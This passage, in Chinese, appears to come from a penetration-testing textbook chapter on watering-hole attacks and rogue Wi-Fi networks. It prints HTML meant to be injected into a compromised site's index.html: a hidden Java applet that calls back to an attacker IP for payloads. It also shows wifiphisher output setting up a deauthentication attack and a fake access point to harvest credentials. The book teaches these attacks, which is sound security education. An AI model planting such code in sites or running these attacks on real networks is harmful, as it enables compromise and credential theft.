
*Rogue* 不一定意味着你创建了一个假站点，但它可能表示你正在使用合法平台在其不知情的情况下发起攻击。水坑攻击是一种社交工程攻击，利用人们经常访问的网站进行攻击。在野外，水坑是动物经常聚集的地方，甚至可能逗留的地方。因为水是生命所必需，且并非所有动物都能从食物中摄取到足够的水分，水坑是等待动物光顾的理想地点。这种攻击方式与此类似。

在水坑攻击中，你会获得一个被大量访问的网站并向其植入恶意软件。这并不意味着该攻击易于执行，但通过使用它，你有潜力快速获取大量系统。与仅仅入侵单个系统不同，如果你入侵一个被目标人群频繁访问的网站，就能通过入侵单个系统获取许多系统的访问权限。一旦克服了入侵网站的难关——例如，如果你入侵 `espn.com`，你会看到大量男性经常前往该站点——攻击的实施就变得容易了。下面的代码片段展示了在 `index.html` 页面底部添加的几行内容。

**带有 Applet 引用的攻击 HTML**

```
 </script>
 
   <applet code="Java.class" width="1" height="1" archive="hkFKIKkhSvSHss.jar"><param name="name"><param name="1" value="http://192.168.86.57:80/krmnAir"><param name="2" value="ZGF0YQ=="><param name="3" value="http://192.168.86.57:80/qpaacQk"><param name="4" value="http://192.168.86.57:80/FMLhoBQCuNH">
 
 
```

这需要你拥有一个可以使用的 Applet，它可以是找到的也可以是自行创建的。正如许多其他事物一样，Metasploit 可以用于此类攻击载荷。该 HTML 片段指示浏览器加载 Java 类，该类位于名为 `hkFKIKkhSvSHss.jar` 的 JAR 文件中。这是一个随机生成的文件名。该攻击还包含一个回连，指向在攻击中加载的 IP 地址。

水坑攻击并非唯一的网络基础攻击，但它们具有针对性的优势，通常在针对组织时更为有用。你可以在内部服务器上植入攻击，因为公司员工经常访问这些网站，从而可能在被 compromized 主机上获取大量桌面系统。

**无线社交工程**

Wi‑Fi 网络已无处不在，且许多设备根本不支持有线连接，这使得人们普遍期望能够使用 Wi‑Fi 网络。你可以利用这一点。几乎任何地方都能找到大量 Wi‑Fi 网络列表。仅在我的客厅里，一个小社区就有将近二十个可用的 Wi‑Fi 网络。你可以在 [Figure 10.9](#c10.xhtml#c10-fig-0009) 中看到该列表。网络命名没有限制，也没有中央登记机构。即使在同一物理空间内，也可以有重名的网络。客户端决定实际连接哪个网络。

由于缺乏明确的网络选择方式，你可以利用这一点：即使你查看基础服务集标识符（BSSID），它也只是一个 MAC 地址，无法提供任何有意义的信息。你可以轻松创建一个恶意 Wi‑Fi 网络，这为获取用户名和密码提供了许多有趣的可能性。

![FIGURE 10.9 List of Wi‑Fi networks](images/c10f009.png)

[**FIGURE 10.9**](#c10.xhtml#R_c10-fig-0009) List of Wi‑Fi networks

无线网络最初被认为不如有线网络，因为很容易从空气中捕获信号。这确实是事实。我们无法在信号传输后限制谁能接收这些无线信号。为了防止信号被捕获，已尝试多次对传输进行加密。第一种是有线等效隐私（WEP），但它存在多个缺陷，导致 WEP 传输可以被轻易解密。随后出现了 Wi‑Fi Protected Access（WPA），旨在纠正 WEP 的一些问题。

WPA 并未完全成功，随后出现了 WPA2，最终被 WPA3 取代。WEP 使用预共享密钥（PSK）进行用户认证。WPA 引入了企业认证，这意味着 WPA、WPA2 和 WPA3 都可以在允许设备连接网络前要求用户名和密码进行认证。这并非唯一的认证方式，但它是其中一种。通常，公司无线网络中使用的用户名和密码与用于认证公司服务器（如 Active Directory 服务器）的凭据相同，因为这些服务器负责企业整体的认证。

在某些情况下，用户仅连接 Wi‑Fi 网络，系统会弹出所谓的 *captive portal*，即功能受限的网页，通常包含用于输入认证凭据的表单。你会在酒店和有时在机场看到这类页面。在酒店，你可能需要使用会员凭据登录，或提供姓氏和房间号以证明你是真实的酒店客人。这里也是获取用户凭据的好地方。

无论哪种情况，用户都需要进行认证，你可以通过靠近建筑物获取网络信号并尝试连接，从而进行侦察。你还可以配置抓取用户密码的方式。此设置需要一定技巧和努力。Kali Linux 具备所有所需工具，包括 `hostapd` 和 `iptables`。`hostapd` 将无线接口转换为接入点，而 `iptables` 用于将无线接口的流量路由通过另一接口到 Internet。随后可以使用其他程序捕获流量以获取认证凭据。

另一种方法是使用 `wifiphisher`。该程序会自动处理很多工作，包括创建能够在目标系统上安装软件的情景。其在线文档已过时。与其通过命令行传递所有参数不同，直接运行程序并在交互式界面中做出选择同样方便。启动后，你会看到它会设置一对无线接口，然后启动 DHCP 服务器和 `iptables`，这两者都是让用户看似合法连接到接入点所必需的。

**启动 wifiphisher**

```
 kilroy@portnoy:~$ sudo wifiphisher
 [*] Starting Wifiphisher 1.4GIT ( https://wifiphisher.org ) at 2023-01-25 01:21
 [+] Timezone detected. Setting channel range to 1-13
 [+] Selecting wfphshr-wlan0 interface for the deauthentication attack
 [+] Selecting wlan0 interface for creating the rogue Access Point
 [+] Changing wlan0 MAC addr (BSSID) to 00:00:00:9e:e7:b5
 [+] Sending SIGKILL to wpa_supplicant
 [+] Changing wlan0 MAC addr (BSSID) to 00:00:00:3e:48:01
 [+] Changing wlan1 MAC addr to 00:00:00:cc:3f:74
 [*] Cleared leases, started DHCP, set up iptables
          
```
